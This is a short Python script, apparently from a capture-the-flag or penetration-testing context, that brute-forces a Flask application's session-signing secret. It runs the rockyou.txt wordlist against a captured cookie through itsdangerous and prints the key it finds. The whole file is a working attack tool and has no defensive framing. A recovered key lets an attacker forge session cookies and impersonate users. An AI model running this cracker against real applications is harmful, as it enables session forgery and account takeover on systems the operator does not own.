# crack.py
# Reference: https://blog.paradoxis.nl/defeating-flasks-session-management-65706ba9d3ce

from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadSignature
from hashlib import sha1

password = open('rockyou.txt', 'r', encoding='latin_1').read().split('\n')
print('Listing Success\n')

session = '[removed]'

for secret in password:
    try:
        signer = URLSafeTimedSerializer(
            secret_key = secret, 
            salt = 'cookie-session',
            serializer = session_json_serializer,
            signer_kwargs = {'key_derivation': 'hmac', 'digest_method': sha1}
        ).loads(session)
    except BadSignature:
        continue

    print('Secret Key: {}'.format(secret))
    break
